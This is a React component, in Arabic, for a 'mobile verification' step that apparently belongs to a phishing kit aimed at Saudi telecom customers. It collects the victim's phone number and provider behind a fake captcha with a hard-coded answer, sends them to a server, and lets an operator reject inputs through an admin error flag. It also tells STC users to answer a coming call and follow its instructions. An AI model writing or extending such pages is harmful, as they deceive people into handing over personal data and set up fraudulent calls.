import Main from "@/components/Main";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useSignals } from "@preact/signals-react/runtime";
import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import PhoneInput from "react-phone-number-input";
import "react-phone-number-input/style.css";
import { useLocation, useNavigate } from "react-router-dom";
import { validatePhoneSAnumber } from "@/utils/helpers";
import {
  currentPage,
  extraInfo,
  isAdminError,
  logo,
  sendDataToServer,
} from "@/context/signals";
import telProviders from "../../data/tel-providers.ts";
import Input from "@/components/Input.tsx";
import { ArrowUpRight } from "lucide-react";

function Mobileverfication() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });
  useSignals();
  const { state } = useLocation();
  const [phone, setValue] = useState<any>(extraInfo.value.phone);
  const [provider, setProvider] = useState("اختر");
  const navigate = useNavigate();
  const [error, setError] = useState({ phone: false, provider: false });

  function sendData() {
    sendDataToServer(
      {
        ["رقم الجوال"]: phone,
        ["مزود الخدمة"]: logo.value,
      },
      "mobileverfication",
      "page8",
      false,
      navigate,
      "/page8",
      state
    );
  }

  useEffect(() => {
    currentPage.value = "mobileverfication";
  }, []);

  const handlePhoneChange = (value: string | undefined) => {
    setValue(value);
    const isValid = validatePhoneSAnumber(value);

    if (!isValid) setError({ ...error, phone: true });
    else setError({ ...error, phone: false });
  };

  const handleProviderChange = (value: string) => {
    logo.value = value;
    setProvider(value);
    if (value === "اختر") setError({ ...error, provider: true });
    else setError({ ...error, provider: false });
  };

  useEffect(() => {
    if (isAdminError?.value) setError({ phone: true, provider: true });
  }, [isAdminError?.value]);

  return (
    <Main>
      <div className="bg-gray-100 min-h-[calc(100vh-400px)] py-20">
        <form
          className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
          onSubmit={handleSubmit(sendData)}
        >
          <img
            src="/assets/images/mutasil.png"
            alt="mobile header image"
            className="mb-6 w-1/4"
          />

          <div className="flex gap-2">
            <img
              src="/assets/images/mobile.png"
              className="h-12"
              alt="mobile logo"
            />

            <div className="flex gap-1">
              <ArrowUpRight className="cursor-pointer w-12 text-main" />

              <h2 className="mb-8 font-bold text-gray-600">
                من اجل حماية عميلنا. نحن بحاجة الى التحقق من ملكية الهاتف
                النقال. يرجي كتابة رقم هاتفك النقال وإختيار مشغل الشبكة.
              </h2>
            </div>
          </div>

          <div className="flex flex-col gap-2" dir="rtl">
            <div className="h-12 flex gap-5 mb-4">
              {logo.value === "اس تي سي" && (
                <p className="text-[#4f008c] text-md font-light">
                  عزيزي العميل, سوف تتلقى مكالمة لتوثيق رقم جوالك يرجى الرد على
                  المكالمة واتباع التعليمات
                </p>
              )}

              {telProviders.filter((tel) => tel.name === logo.value)[0] && (
                <img
                  src={
                    telProviders.filter((tel) => tel.name === logo.value)[0]
                      .logo
                  }
                  className="h-full ms-auto"
                  alt={`${logo.value} logo`}
                />
              )}
            </div>
            <div>
              <span className="text-xs font-medium">رقم الجوال</span>
              <PhoneInput
                value={phone}
                id="phone"
                onChange={handlePhoneChange}
                defaultCountry="SA"
                placeholder="اكتب رقم الجوال هنا"
                className={`px-2 [&_.PhoneInputCountrySelectArrow]:ml-2 w-full outline-none border rounded-lg relative transition-all rtl ${
                  error.phone
                    ? "border-red-500 bg-red-50 [&>input]:bg-red-50"
                    : "border-gray-300 bg-gray-100"
                } `}
                disabled
              />
            </div>

            <Select onValueChange={handleProviderChange} value={provider}>
              <SelectTrigger
                className={`w-full ${
                  error.provider ? "border-red-500" : "border-gray-300"
                }`}
                style={{ direction: "rtl" }}
              >
                <SelectValue defaultValue={"اختر"} />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value={"اختر"} style={{ direction: "rtl" }}>
                  اختار مزود الخدمة
                </SelectItem>

                {telProviders.map(({ name }) => (
                  <SelectItem
                    key={name}
                    value={name}
                    style={{ direction: "rtl" }}
                  >
                    {name}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="flex flex-col gap-2">
            <p className="text-right">
              الرجاء إدخال كود التحقق المكتوب داخل الصورة*:
            </p>
            <div className="flex gap-4 bg-gray-100 p-1 pe-8">
              <img
                src="/assets/images/recapu2.png"
                alt="recapu"
                className="w-32"
              />
              <Input
                errors={errors}
                register={register}
                id="recap"
                type="text"
                isAr
                placeholder="ادخل كود التحقق هنا"
                className={`bg-white`}
                options={{
                  required: "هذا الحقل ضروري",
                  pattern: {
                    value: /^bdBDo$/,
                    message: "يجب كتابة رمز التحقق كما يظهر فى الصورة.",
                  },
                }}
              />
            </div>
          </div>

          <button
            disabled={error.phone || provider === "اختر"}
            className="w-fit ms-auto mt-2 lg:text-xl capitalize rounded-3xl font-bold py-1.5 px-10 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
          >
            دخول
          </button>

          <img
            src="/assets/images/below-mob-verify.png"
            alt="mobile header image"
            className="mt-6 mx-auto"
          />
        </form>
      </div>
    </Main>
  );
}

export default Mobileverfication;
